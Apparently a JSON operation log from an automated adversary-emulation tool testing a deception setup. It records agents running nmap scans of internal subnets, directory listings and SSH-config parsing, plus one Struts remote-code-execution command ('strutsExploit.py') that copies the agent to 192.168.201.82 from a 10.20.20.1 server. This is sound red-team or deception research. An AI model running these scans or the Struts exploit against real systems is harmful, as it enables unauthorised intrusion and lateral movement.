"custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:28Z"}, {"id": "797b6935-d781-4c85-9519-9bb5b3cfe0be", "paw": "dagwxr", "command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:44:31Z", "pin": 0, "pid": "1499", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b3b80>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b02e0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b12d0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b30a0>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b2740>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b25c0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b2e60>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b0820>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b3700>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b2cb0>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452e830>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452e2c0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:44:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.2,3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.2,3,4,5", "created": "2024-04-26T23:44:31Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "797b6935-d781-4c85-9519-9bb5b3cfe0be", "collect": "2024-04-26T23:44:36Z", "finish": "2024-04-26T23:44:43Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:36Z"}, {"id": "53373ed6-1451-4f17-a25f-28625cb84e5d", "paw": "czljvk", "command": "python3 strutsExploit.py 192.168.201.82:8080 http://10.20.20.1:8888", "plaintext_command": "python3 strutsExploit.py 192.168.201.82:8080 http://10.20.20.1:8888", "status": 0, "score": 3, "decide": "2024-04-26T23:44:46Z", "pin": 0, "pid": "1493", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.82", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.82", "created": "2024-04-26T23:44:46Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}, {"unique": "host.lateralMove.port8080", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": 8080, "created": "2024-04-26T23:44:46Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}], "unique": "53373ed6-1451-4f17-a25f-28625cb84e5d", "collect": "2024-04-26T23:44:47Z", "finish": "2024-04-26T23:44:49Z", "ability": {"ability_id": "deception-struts", "tactic": "deception-lateral-movement", "technique_name": "Struts", "technique_id": "T9061", "name": "Exploit Apache Struts RCE", "description": "Copies agent to target using Apache Struts RCE", "executors": [{"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:47Z"}, {"id": "03c70278-da91-47c1-807a-93dd50ea9b4c", "paw": "gbimmx", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 1, "score": 0, "decide": "2024-04-26T23:44:51Z", "pin": 0, "pid": "5645", "facts": [], "relationships": [], "used": [], "unique": "03c70278-da91-47c1-807a-93dd50ea9b4c", "collect": "2024-04-26T23:44:53Z", "finish": "2024-04-26T23:44:53Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:44:53Z"}, {"id": "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "paw": "gbimmx", "command": "ls -l /home/tomcat/", "plaintext_command": "ls -l /home/tomcat/", "status": 0, "score": 1, "decide": "2024-04-26T23:44:56Z", "pin": 0, "pid": "5647", "facts": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:44:56Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["ad7463f9-d256-4ec9-8995-e54deeab4ac5"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["gbimmx"], "technique_id": null}, {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "fe2f6f79-c116-48b3-9fd3-20947b3992db", "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "gbimmx", "jyirhn"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4d10730>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479e7a0>", "source": {"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:44:56Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["ad7463f9-d256-4ec9-8995-e54deeab4ac5"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["gbimmx"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:45:05Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:44:56Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["ad7463f9-d256-4ec9-8995-e54deeab4ac5"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["gbimmx"], "technique_id": null}], "unique": "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "collect": "2024-04-26T23:45:05Z", "finish": "2024-04-26T23:45:05Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:05Z"}, {"id": "eb86450f-4dd7-44f7-b23c-7a804120854d", "paw": "gbimmx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:45:06Z", "pin": 0, "pid": "5649", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:45:06Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "eb86450f-4dd7-44f7-b23c-7a804120854d", "collect": "2024-04-26T23:45:18Z", "finish": "2024-04-26T23:45:18Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:18Z"}, {"id": "86304011-6e80-42fb-80b5-38d35f79a93e", "paw": "gbimmx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:45:21Z", "pin": 0, "pid": "5650", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:45:21Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "86304011-6e80-42fb-80b5-38d35f79a93e", "collect": "2024-04-26T23:45:24Z", "finish": "2024-04-26T23:45:24Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:45:24Z"}, {"id": "5b27ada4-24bf-4c17-82a1-a86ebcf18a23", "paw": "gbimmx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 1, "score": 1, "decide": "2024-04-26T23:45:26Z", "pin": 0, "pid": "5651", "facts": [], "relationships": [], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:45:26Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "5b27ada4-24bf-4c17-82a1-a86ebcf18a23", "collect": "2024-04-26T23:45:31Z", "finish": "2024-04-26T23:45:31Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", 